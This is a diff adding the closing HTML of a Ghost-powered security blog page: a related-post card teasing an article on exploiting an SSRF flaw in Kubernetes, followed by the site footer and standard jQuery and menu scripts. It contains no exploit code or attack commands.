+            <header class="post-card-header">
+                <h2 class="post-card-title">Exploiting SSRF in Kubernetes</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>While testing an API that was exposed to the Internet, I found an unauthorised SSRF vulnerability that allowed me to trick the server into performing any GET request using http or https protocol. I had access to the response (i.e.: this wasn't a blind SSRF), full control of the</p>
+            </section>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/ines/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/ines/index.html">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2024-04-01">Apr 1, 2024</time> <span class="bull">&bull;</span> 1 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+    </div>
+</aside>
+
+
+    </main>
+
+    <footer class="site-footer outer">
+        <div class="inner">
+            <section class="copyright"><a href="../index.html"></a> &copy; 2024</section>
+            <nav class="site-footer-nav">
+                
+            </nav>
+            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+        </div>
+    </footer>
+
+</div>
+
+
+<script
+    src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
+    crossorigin="anonymous">
+</script>
+<script src="../assets/built/casper.js%3Fv=16cc7bf6be"></script>
+<script>
+$(document).ready(function () {
+    // Mobile Menu Trigger
+    $('.gh-burger').click(function () {
+        $('body').toggleClass('gh-head-open');
+    });
+    // FitVids - Makes video embeds responsive
+    $(".gh-content").fitVids();
+});
+</script>
+
+
+
+</body>
+</html>
